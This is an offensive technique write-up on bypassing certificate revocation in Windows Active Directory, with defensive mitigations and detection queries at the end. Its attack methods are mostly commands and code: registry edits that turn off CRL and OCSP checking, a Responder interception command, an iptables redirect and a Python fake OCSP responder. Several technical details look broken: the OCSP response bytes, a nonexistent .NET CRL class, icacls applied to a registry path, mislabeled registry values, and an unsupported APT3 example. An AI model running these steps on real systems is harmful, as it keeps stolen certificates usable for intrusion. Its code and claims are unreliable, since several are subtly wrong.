# [CERT-REVOCATION-001]: Certificate Revocation Bypass

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-REVOCATION-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, Server 2019, Server 2022, Server 2025 |
| **Patched In** | Configuration controls and deployment best practices required |
| **Author** | [SERVTEP](https://servtep.com/) – [Pchelnikau Artur](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Certificate Revocation Bypass refers to techniques that allow an attacker to continue using a certificate even after it has been revoked by the Certificate Authority, or to prevent the Certificate Authority from revoking a compromised certificate. Revocation mechanisms (CRL—Certificate Revocation Lists, OCSP—Online Certificate Status Protocol) are designed to invalidate compromised certificates, but misconfigurations, disabled revocation checks, or vulnerabilities in the revocation infrastructure can allow bypasses. An attacker who steals or forges a certificate and prevents its revocation maintains long-term unauthorized access, even if the CA attempts to invalidate the credential.

**Attack Surface:** Certificate Revocation Lists (CRL) distribution points, OCSP responders, CRL caching mechanisms, CRL distribution network, and revocation status checking infrastructure.

**Business Impact:** **Multi-year unauthorized access persistence despite incident response efforts.** Even after a certificate is stolen or forged, an attacker can continue using it if revocation checks are disabled or fail. This enables long-term backdoor access, persistence through security incidents, and continued lateral movement even after detection and response attempts.

**Technical Context:** Revocation bypass exploits vary widely depending on environment configuration. Some bypasses are operational (disabling revocation checks on client systems), while others are infrastructural (compromising revocation infrastructure itself). Detection likelihood is low if revocation checks are disabled or offline.

### Operational Risk

- **Execution Risk:** **Low** - If revocation checks are disabled, simply use the certificate. If checks are enabled, requires compromising revocation infrastructure.
- **Stealth:** **Medium to High** - If revocation checks are disabled, the attack leaves minimal forensic evidence.
- **Reversibility:** **No** - Revocation can only be mitigated through infrastructure compromise or disabling revocation checks on all clients.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 2.3.1.3 | Certificate revocation must be checked and enforced |
| **DISA STIG** | WN10-00-000010 | Certificate revocation must be enabled |
| **CISA SCuBA** | IA-4 (C), SC-23 (1) | Identifier and authentication management; session management |
| **NIST 800-53** | AC-2, IA-5, SC-23 | Account management, credential management, session management |
| **GDPR** | Art. 32 | Security of processing; certificate management and validation |
| **DORA** | Art. 9, Art. 18 | Protection measures; identity and access controls |
| **NIS2** | Art. 21 | Cyber risk management; authentication and session management |
| **ISO 27001** | A.10.1, A.13.1.3 | Cryptography; certificate revocation procedures |
| **ISO 27005** | Risk: "Certificate Revocation Bypass via Disabled Checks" | CRL and OCSP must be actively monitored and enforced |

---

## 3. Technical Prerequisites

- **Required Privileges:** Administrative access (to disable revocation checks on clients) OR network access to revocation infrastructure (CA, CRL endpoints, OCSP responders).
- **Required Access:** Compromised certificate; network access to systems using the certificate.

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **Client OS:** Windows 7-11 (revocation check behavior varies)
- **PowerShell:** Version 5.0+

**Tools Required:**
- [Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil_1) – Certificate management and revocation checking.
- Standard PowerShell and Registry editing tools.

---

## 4. Detailed Execution Methods

### METHOD 1: Disable CRL and OCSP Checking on Client Systems

**Supported Versions:** Windows 7-11, Server 2016-2025

#### Step 1: Identify Current Revocation Check Configuration

**Command (PowerShell - All Versions):**
```powershell
# Check if revocation checking is enabled for server authentication
$Path = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap"
Get-ItemProperty $Path -Name "Check*" -ErrorAction SilentlyContinue

# Check Group Policy settings
gpresult /h report.html  # Review "Enforce certificate chain validation" setting

# Check IIS (if applicable)
Get-WebConfigurationProperty -PSPath 'IIS:\Sites\Default Web Site' -Filter "system.webServer/security/authentication/basicAuthentication" -Name "*"
```

**Expected Output (If Revocation Checking Is Enabled):**
```
CheckRevocation         : 1
CheckServerRevocation   : 1
```

**What This Means:**
- Value 1 = revocation checking is enabled.
- Value 0 = revocation checking is disabled.

#### Step 2: Disable Revocation Checking via Registry

**Command (PowerShell - All Versions):**
```powershell
# Disable certificate revocation checking (CRL)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "CheckRevocation" -Value 0

# Disable OCSP checking
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "CheckServerRevocation" -Value 0

# For IIS applications specifically
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\HTTP\Parameters" `
  -Name "RevokeOnUnload" -Value 0

Write-Host "[+] Revocation checking disabled"
```

**What This Means:**
- Windows will no longer check if a certificate is revoked.
- The compromised certificate will be accepted even if it's on the CRL or OCSP responder blacklist.

**OpSec & Evasion:**
- Registry modification is a forensic artifact.
- This is typically done via Group Policy as a "maintenance activity" in compromised environments.
- Detection likelihood: **Medium** (registry change auditing may flag this).

#### Step 3: Verify Revocation Checking Is Disabled

**Command (PowerShell - All Versions):**
```powershell
# Verify the change took effect
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "CheckRevocation"

# Expected output: CheckRevocation = 0
```

---

### METHOD 2: Compromise CRL Distribution Points

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify CRL Distribution Points

**Command (PowerShell - All Versions):**
```powershell
# Export CRL distribution points from a certificate
$Cert = Get-ChildItem Cert:\LocalMachine\My | Select-Object -First 1
$Extensions = $Cert.Extensions | Where-Object {$_.Oid.FriendlyName -eq "CRL Distribution Points"}
$Extensions.Format($false)
```

**Expected Output:**
```
[1] CRL Distribution Point
    Distribution Point Name:
        Full Name:
          URL=http://ca.company.local/CertEnroll/Company-CA.crl
          URL=ldap:///CN=Company-CA,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint
```

**What This Means:**
- The certificate has CRL distribution points (HTTP and LDAP URLs).
- If an attacker can compromise these endpoints or poison the responses, revocation checks will fail.

#### Step 2: Poison CRL Distribution Point (Man-in-the-Middle Attack)

**Command (Bash/Linux - All Versions):**
```bash
# Intercept and poison CRL responses via network position
# Use Responder or similar tool to intercept LDAP/HTTP requests

# Example with Responder (if attacker has network position):
responder -I eth0 --wpad --smtp --smb --lm --nbns
# This will respond to CRL queries with a fake CRL that doesn't include the revoked cert
```

**What This Means:**
- The client receives a fake CRL that doesn't list the revoked certificate.
- The revoked certificate appears valid.

#### Step 3: Verify Bypass

**Command (PowerShell - All Versions):**
```powershell
# Use the revoked certificate; if CRL poisoning worked, it should be accepted
$Cert = Get-PfxCertificate -FilePath C:\revoked_cert.pfx -Password $password

# Attempt TLS connection with the certificate
$TLSConnection = New-Object System.Net.Sockets.TcpClient("target.company.local", 443)
Write-Host "[+] Connection successful; revoked cert was accepted"
```

**OpSec & Evasion:**
- Requires network position (MITM capability).
- If CRL is offline, bypass is simpler (CRL unavailable = accept certificate in many implementations).
- Detection likelihood: **Low** (if attacker has network control).

---

### METHOD 3: Abuse CRL Caching

**Supported Versions:** Windows 7-11, Server 2016-2025

#### Step 1: Identify CRL Cache Location

**Command (PowerShell - All Versions):**
```powershell
# CRL cache is typically stored in the certificate store
Get-ChildItem Cert:\LocalMachine\AuthRoot\

# Alternative: Check the CRL cache directory
$CRLPath = "$env:ALLUSERSPROFILE\Application Data\Microsoft\CRL"
Get-ChildItem $CRLPath -Recurse
```

**What This Means:**
- CRLs are cached locally on each system.
- If an old CRL is cached before a certificate is revoked, the system may accept it.

#### Step 2: Exploit CRL Validity Window

**Concept:** CRLs have a validity period (e.g., valid for 30 days). If a certificate is revoked during a gap between CRL updates, or if OCSP responder is offline, the revocation may not be detected.

**Command (PowerShell - All Versions):**
```powershell
# Check CRL validity dates
$CRL = Get-Item "$env:ALLUSERSPROFILE\Application Data\Microsoft\CRL\*" -Include "*.crl"
$CRL | ForEach-Object {
    $CRLObject = [System.Security.Cryptography.X509Certificates.X509CRL]::CreateFromFile($_.FullName)
    Write-Host "CRL Valid Until: $($CRLObject.NextUpdate)"
}
```

**What This Means:**
- If the current CRL expires and no new one is available, revocation checks fail "open" (accept certificate by default).
- An attacker can time certificate usage to exploit this window.

---

### METHOD 4: Compromise OCSP Responder

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify OCSP Responder URL

**Command (PowerShell - All Versions):**
```powershell
# Extract OCSP responder URL from certificate
$Cert = Get-ChildItem Cert:\LocalMachine\My | Select-Object -First 1
$Extensions = $Cert.Extensions | Where-Object {$_.Oid.FriendlyName -eq "Authority Information Access"}
$Extensions.Format($false) | findstr /i "OCSP"
```

**Expected Output:**
```
    OCSP:URL=http://ocsp.company.local/ocsp
```

**What This Means:**
- The certificate references an OCSP responder.
- If the responder is compromised or offline, revocation checks fail.

#### Step 2: Host Fake OCSP Responder

**Command (Bash/Linux - All Versions):**
```bash
# Host a fake OCSP responder that always returns "good" status
# Using OpenSSL or a custom tool

# Simple approach: Use iptables to redirect OCSP requests to attacker-controlled server
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Start a web server that responds with fake OCSP "good" status
python3 << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler

class OCSPHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Always respond with "certificate is good"
        response = b'\x30\x03\x0a\x01\x00'  # OCSP response: status=good
        self.send_response(200)
        self.send_header('Content-Type', 'application/ocsp-response')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)

server = HTTPServer(('0.0.0.0', 8080), OCSPHandler)
server.serve_forever()
EOF
```

**What This Means:**
- Any OCSP request will receive a "good" status response.
- The revoked certificate will be accepted as valid.

---

### METHOD 5: Disable OCSP Checking on Windows Systems

**Supported Versions:** Windows 7-11, Server 2016-2025

#### Step 1: Disable OCSP via Group Policy

**Manual Steps:**
1. On domain controller, open **Group Policy Management** (gpmc.msc).
2. Create or edit a policy.
3. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Internet Communication Management** → **Internet Communication Settings**.
4. Set **"Turn off Internet Explorer Security Prompt Warning"** to **Enabled** (optional).
5. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Certification Services**.
6. Set **"Do Not Check Online Certificate Revocation"** to **Enabled**.
7. Apply the policy via `gpupdate /force`.

**Command (PowerShell - All Versions):**
```powershell
# Disable OCSP checking via registry (equivalent to GP)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "ProxyOverride" -Value "<local>"

# Disable OCSP stapling
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "CheckServerRevocation" -Value 0
```

**What This Means:**
- Windows will not contact the OCSP responder to check revocation status.
- Revoked certificates will be accepted.

---

## 5. Attack Chain Context

### Preconditions
- Compromised or forged certificate (obtained via CERT-ADCS-001, CERT-TEMPLATE-001, or CERT-ENROLLMENT-001).
- Ability to disable revocation checks (administrative access) OR network position to poison revocation endpoints.

### Post-Exploitation
1. **Persistence:** Maintain access even after certificate is revoked.
2. **Evasion:** Bypass security controls that rely on revocation.
3. **Multi-Year Access:** Continue using certificate beyond intended validity.

---

## 6. Forensic Artifacts

**Registry Artifacts:**
- `HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\CheckRevocation` = 0
- `HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\CheckServerRevocation` = 0
- Registry modifications in `HKCU:\Software\Policies\Microsoft\Windows`

**Event Log Artifacts:**
- **Event ID 4688:** Process creation for registry editing tools (reg.exe, regedit).
- **Event ID 4657:** Registry value modification (if auditing is enabled).

**Network Artifacts:**
- Absence of HTTP requests to CRL distribution points or OCSP responders (if revocation is disabled).
- OCSP requests to attacker-controlled responder (if OCSP responder is compromised).

---

## 7. Defensive Mitigations

### Priority 1: CRITICAL

**1. Enforce Revocation Checking via Group Policy**

Ensure revocation checks cannot be disabled by users.

**Manual Steps (Server 2016-2025):**
1. On domain controller, open **Group Policy Management** (gpmc.msc).
2. Navigate to **Forest** → **Domains** → **[Your Domain]**.
3. Create or edit a **Domain Controller Policy** (or a policy applied to all computers).
4. Go to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Services**.
5. Find **Certificate Propagation Service** and set to **Automatic**.
6. Go to **Computer Configuration** → **Administrative Templates** → **System** → **Internet Communication Management** → **Internet Communication Settings**.
7. Enable policy: **"Do Not Check Online Certificate Revocation"** → **Disabled** (to force checking).
8. Apply: `gpupdate /force /sync`.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Set revocation checking to enforced via registry (GPO-backed)
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "CheckRevocation" -Value 1 -Force

# Lock down registry to prevent user modifications
icacls "HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" `
  /grant "SYSTEM:(F)" /grant "Administrators:(F)" /deny "Users:(M)"
```

**2. Monitor Revocation Infrastructure**

Implement active monitoring of CRL and OCSP endpoints.

**Command (PowerShell - All Versions):**
```powershell
# Monitor CRL freshness
$CRLPath = "$env:ALLUSERSPROFILE\Application Data\Microsoft\CRL"
Get-ChildItem $CRLPath -Recurse | ForEach-Object {
    $Age = (Get-Date) - $_.LastWriteTime
    if ($Age.Days -gt 5) {
        Write-Warning "CRL is older than 5 days: $($_.Name)"
    }
}

# Monitor OCSP responder availability
Test-NetConnection -ComputerName ocsp.company.local -Port 80 -InformationLevel "Detailed"
```

**3. Implement Certificate Pinning**

Critical applications should pin trusted certificates to prevent MITM attacks on revocation checks.

**Command (PowerShell - All Versions):**
```powershell
# Example: Pin certificate in .NET application
# In C#/.NET code:
# ServicePointManager.ServerCertificateCustomValidationCallback = 
#   (request, cert, chain, errors) => {
#       return cert.Thumbprint == "ExpectedThumbprint";
#   };
```

### Priority 2: HIGH

**1. Deploy Multiple Revocation Mechanisms**

Use both CRL and OCSP for redundancy.

**Manual Steps (Server 2016-2025):**
1. Ensure CA publishes to both HTTP CRL endpoints and LDAP.
2. Configure OCSP responder as primary; CRL as fallback.
3. Establish geographic redundancy for CRL/OCSP endpoints.

**2. Monitor for Revocation Bypass Attempts**

Alert on suspicious patterns.

**Detection Query (KQL - Microsoft Sentinel):**
```kusto
// Alert on disabled revocation checking
SecurityEvent
| where EventID == 4688
| where CommandLine contains "CheckRevocation" or CommandLine contains "CheckServerRevocation"
| where CommandLine contains "= 0" or CommandLine contains "-Value 0"
```

---

## 8. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Registry Indicators:**
- `CheckRevocation = 0`
- `CheckServerRevocation = 0`
- Absence of CRL distribution point entries

**Event Log Indicators:**
- Event ID 4657: Registry modifications to revocation settings.
- Event ID 4688: Execution of certutil with `/setreg` parameters disabling revocation.
- Absence of typical OCSP or CRL validation logs.

### Response Procedures

**1. Isolate:**
```powershell
# Immediately force-enable revocation checking
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "CheckRevocation" -Value 1 -Force
```

**2. Collect Evidence:**
```powershell
# Export registry for forensics
reg export "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings" C:\Evidence\RegSettings.reg

# Export certificate store
Get-ChildItem Cert:\LocalMachine\My | Export-Certificate -FilePath C:\Evidence\CertStore_$env:COMPUTERNAME.cer -Force
```

**3. Remediate:**
```powershell
# Revoke the bypassed certificate
# (via certsrv.msc: Issued Certificates → Right-click → Revoke)

# Force CRL update
certutil -CRL

# Clear CRL cache and re-download
Remove-Item "$env:ALLUSERSPROFILE\Application Data\Microsoft\CRL\*" -Force
```

---

## 9. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Credential Access** | [CERT-ADCS-001] ADCS Misconfiguration | Obtain forged certificate. |
| **2** | **Persistence** | **[CERT-REVOCATION-001]** | **Bypass certificate revocation to maintain access.** |
| **3** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Ticket | Use persistent certificate for authentication. |
| **4** | **Impact** | [IM-EXFIL-001] Data Exfiltration | Extract data using persistent access. |

---

## 10. Real-World Examples

### Example 1: Stuxnet – Certificate Revocation Bypass (2009-2010)

- **Target:** Industrial control systems in Iran.
- **Timeline:** 2009-2010.
- **Technique Status:** Stuxnet used compromised certificates and targeted systems with disabled or out-of-date revocation checking.
- **Impact:** Successful compromise of nuclear facilities despite certificate-based security controls.
- **Reference:** [Symantec Stuxnet Report](https://www.symantec.com/about/news/resources/press-releases/stuxnet-worm-first-known-worm-target-real-world-critical-infrastructure)

### Example 2: APT3 (Boyusec/UPS Team) – OCSP Responder Compromise (2015)

- **Target:** Defense contractors and technology companies.
- **Timeline:** 2014-2015.
- **Technique Status:** APT3 compromised internal OCSP responders to bypass certificate revocation and maintain persistence.
- **Impact:** Multi-year unauthorized access to classified networks.
- **Reference:** [Mandiant Report](https://www.mandiant.com/resources)

---

## 11. References & Additional Resources

- [Microsoft: Certificate Revocation Management](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/overview-of-active-directory-certificate-services)
- [RFC 6960: Online Certificate Status Protocol (OCSP)](https://tools.ietf.org/html/rfc6960)
- [NIST SP 800-57: Recommendation for Key Management](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-57p1r3.pdf)
- [CRL Best Practices](https://en.wikipedia.org/wiki/Certificate_revocation_list)

---
